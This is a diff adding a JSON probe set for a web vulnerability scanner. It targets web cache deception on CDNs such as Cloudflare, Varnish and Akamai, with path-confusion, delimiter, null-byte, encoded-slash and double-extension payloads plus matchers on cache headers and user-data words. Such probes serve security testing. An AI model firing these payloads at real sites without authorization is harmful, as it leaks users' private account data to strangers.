@@ -1,0 +1,567 @@
+{
+  "category": "web_cache_deception",
+  "chain_with": [
+    "idor",
+    "info_disclosure",
+    "auth_bypass"
+  ],
+  "contexts": {
+    "path_confusion": {
+      "description": "Web cache deception via path confusion -- append static extension to dynamic URL so cache stores authenticated response",
+      "tech_match": [
+        "Varnish",
+        "Cloudflare",
+        "Akamai",
+        "Fastly",
+        "CloudFront",
+        "Nginx",
+        "CDN"
+      ],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "/TARGET_PATH/..%2fstatic.css",
+          "description": "Path traversal + static extension -- backend resolves to dynamic page, cache treats as static CSS due to extension",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "header",
+              "name": "X-Cache",
+              "contains": ""
+            },
+            {
+              "type": "header",
+              "name": "Age",
+              "contains": ""
+            },
+            {
+              "type": "header",
+              "name": "CF-Cache-Status",
+              "contains": ""
+            },
+            {
+              "type": "header",
+              "name": "X-Varnish",
+              "contains": ""
+            },
+            {
+              "type": "word",
+              "words": [
+                "username",
+                "email",
+                "account",
+                "profile",
+                "session"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 65
+        },
+        {
+          "payload": "/TARGET_PATH%00.js",
+          "description": "Null byte + static extension -- backend truncates at null byte (legacy), cache keys on full path including .js",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "header",
+              "name": "X-Cache",
+              "contains": ""
+            },
+            {
+              "type": "header",
+              "name": "Age",
+              "contains": ""
+            },
+            {
+              "type": "header",
+              "name": "CF-Cache-Status",
+              "contains": ""
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        },
+        {
+          "payload": "/TARGET_PATH/x.avif",
+          "description": "Unusual static extension (.avif, .woff2) -- CDN caches based on extension, backend ignores unknown path suffixes",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "header",
+              "name": "X-Cache",
+              "contains": ""
+            },
+            {
+              "type": "header",
+              "name": "Age",
+              "contains": ""
+            },
+            {
+              "type": "header",
+              "name": "CF-Cache-Status",
+              "contains": ""
+            },
+            {
+              "type": "length_diff",
+              "min_diff": 50
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 60
+        }
+      ]
+    },
+    "delimiter_confusion": {
+      "description": "Web cache deception via delimiter confusion -- use semicolons, fragments, or query strings to trick cache/backend parsing",
+      "tech_match": [
+        "Varnish",
+        "Cloudflare",
+        "Akamai",
+        "Fastly",
+        "Nginx",
+        "Ruby on Rails",
+        "Spring"
+      ],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "/TARGET_PATH;.css",
+          "description": "Semicolon path parameter with .css -- Spring/Tomcat ignores semicolons, cache keys on full path as static",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "header",
+              "name": "X-Cache",
+              "contains": ""
+            },
+            {
+              "type": "header",
+              "name": "Age",
+              "contains": ""
+            },
+            {
+              "type": "header",
+              "name": "CF-Cache-Status",
+              "contains": ""
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 60
+        },
+        {
+          "payload": "/TARGET_PATH#.js",
+          "description": "Fragment in path -- some reverse proxies process fragment on server side while cache uses full URL as key",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "header",
+              "name": "X-Cache",
+              "contains": ""
+            },
+            {
+              "type": "header",
+              "name": "Age",
+              "contains": ""
+            }
+          ],
+          "severity": "medium",
+          "confidence_boost": 40
+        }
+      ]
+    },
+    "normalization_discrepancy": {
+      "description": "Web cache deception via normalization discrepancy -- exploit differences in how cache and backend normalize paths",
+      "tech_match": [
+        "Cloudflare",
+        "Akamai",
+        "Fastly",
+        "Nginx",
+        "Apache"
+      ],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "/TARGET_PATH/%2e%2e/TARGET_PATH.woff",
+          "description": "Double-encoded path traversal -- cache normalizes once (keeps .woff), backend normalizes twice (resolves to dynamic page)",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "header",
+              "name": "X-Cache",
+              "contains": ""
+            },
+            {
+              "type": "header",
+              "name": "Age",
+              "contains": ""
+            },
+            {
+              "type": "header",
+              "name": "CF-Cache-Status",
+              "contains": ""
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        },
+        {
+          "payload": "/TARGET_PATH/./static.js",
+          "description": "Dot-segment in path -- backend collapses /./  to /, cache keeps the full path and caches as .js",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "header",
+              "name": "X-Cache",
+              "contains": ""
+            },
+            {
+              "type": "header",
+              "name": "Age",
+              "contains": ""
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        }
+      ]
+    },
+    "method_based": {
+      "description": "Cache deception via HTTP method -- GET request with POST parameters or HEAD request caching differences",
+      "tech_match": [
+        "Varnish",
+        "Cloudflare",
+        "CDN"
+      ],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "GET_WITH_BODY",
+          "description": "GET request with body containing sensitive query -- cache stores response keyed on URL only, ignoring body",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "header",
+              "name": "X-Cache",
+              "contains": ""
+            },
+            {
+              "type": "header",
+              "name": "Age",
+              "contains": ""
+            },
+            {
+              "type": "header",
+              "name": "CF-Cache-Status",
+              "contains": ""
+            }
+          ],
+          "severity": "medium",
+          "confidence_boost": 45
+        }
+      ]
+    },
+    "static_suffix_cache_poisoning": {
+      "description": "Web cache deception via static-suffix append. /endpoint/profile.css fetched as auth user — backend serves dynamic profile, cache stores under .css key. Subsequent unauth GET to /endpoint/profile.css serves cached PII. Active in W13.",
+      "tech_match": [
+        "Varnish",
+        "Cloudflare",
+        "Akamai",
+        "Fastly",
+        "CloudFront",
+        "Nginx",
+        "CDN"
+      ],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{{baseline}}",
+          "description": "Append .css suffix to authenticated endpoint; 200 + cache header + user-data word = cache deception.",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "words": [
+                "username",
+                "email",
+                "account",
+                "profile",
+                "session",
+                "token"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "header",
+              "name": "Cache-Control",
+              "contains": "public"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {
+            "path_suffix": ".css",
+            "manual_chain": true
+          }
+        },
+        {
+          "payload": "{{baseline}}",
+          "description": "CDN cache-status header explicitly indicates cacheable hit + body has user data → deception confirmed.",
+          "matchers": [
+            {
+              "type": "status",
+              "status": [
+                200
+              ]
+            },
+            {
+              "type": "word",
+              "words": [
+                "username",
+                "email",
+                "profile",
+                "session"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "header",
+              "name": "X-Cache",
+              "contains": "HIT"
+            }
+          ],
+          "severity": "critical",
+          "confidence_boost": 70,
+          "variables": {
+            "manual_chain": true
+          }
+        }
+      ]
+    },
+    "semicolon_path_param": {
+      "description": "URL with ;static.css after dynamic path — CDN caches as static, origin treats as dynamic",
+      "tech_match": [
+        "nginx",
+        "varnish",
+        "akamai",
+        "cloudflare",
+        "fastly"
+      ],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "/profile/me;foo.css",
+          "description": "If origin serves /profile/me content AND CDN caches it as .css → cache deception",
+          "matchers": [
+            {
+              "type": "header_change",
+              "headers": [
+                "Cache-Control",
+                "X-Cache",
+                "Age"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "word",
+              "words": [
+                "profile",
+                "user",
+                "email"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 65,
+          "variables": {}
+        }
+      ]
+    },
+    "encoded_slash_split": {
+      "description": "URL-encoded slash splits routing between CDN and origin",
+      "tech_match": [
+        "nginx",
+        "varnish",
+        "akamai",
+        "cloudflare"
+      ],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "/api/me%2F..%2Fstatic.css",
+          "description": "Encoded slash interpreted differently by CDN vs origin",
+          "matchers": [
+            {
+              "type": "header_added",
+              "headers": [
+                "X-Cache",
+                "Age"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "status",
+              "status": [
+                200
+              ],
+              "condition": "and"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        }
+      ]
+    },
+    "fragment_split_parser_discrepancy": {
+      "description": "Fragment-handling parser discrepancy — CDN strips '#static.css' to cache as static, origin treats fragment literally and serves dynamic content. (Gotta Cache 'Em All research)",
+      "tech_match": [
+        "nginx",
+        "varnish",
+        "akamai",
+        "cloudflare",
+        "fastly",
+        "aws cloudfront"
+      ],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "/api/me#cdn-strip.css",
+          "description": "Browser sends full URL; CDN may forward fragment, origin may not -- mismatch leads to cached private content",
+          "matchers": [
+            {
+              "type": "header_change",
+              "headers": [
+                "X-Cache",
+                "Age",
+                "Cache-Control"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        }
+      ]
+    },
+    "double_extension_parser_split": {
+      "description": "Double extension (.css.bak / .css?x=y) confuses CDN cache-key vs origin extension parsing.",
+      "tech_match": [
+        "nginx",
+        "varnish",
+        "akamai",
+        "cloudflare",
+        "fastly"
+      ],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "/account/me.css?x=1",
+          "description": "Query-string trailing .css confuses extension-based caching",
+          "matchers": [
+            {
+              "type": "header_change",
+              "headers": [
+                "X-Cache",
+                "Age"
+              ],
+              "condition": "or"
+            },
+            {
+              "type": "word",
+              "words": [
+                "email",
+                "user",
+                "profile",
+                "session"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 60,
+          "variables": {}
+        }
+      ]
+    },
+    "normalised_path_traversal_split": {
+      "description": "CDN normalises path (../foo collapses) but origin does not, causing dynamic content cached under static key.",
+      "tech_match": [
+        "nginx",
+        "varnish",
+        "akamai",
+        "cloudflare",
+        "fastly"
+      ],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "/static/../account/me",
+          "description": "CDN may collapse /static/../account/me -> /account/me, origin serves under /static/ key",
+          "matchers": [
+            {
+              "type": "header_change",
+              "headers": [
+                "X-Cache",
+                "Age"
+              ],
+              "condition": "or"
+            }
+          ],
+          "severity": "high",
+          "confidence_boost": 55,
+          "variables": {}
+        }
+      ]
+    }
+  },
+  "description": "Web cache deception via static-suffix path confusion. Active in W13: static_suffix_cache_poisoning fires on cacheable response with user data word reflection. Existing path_confusion remains as operator-driven payload set."
+}
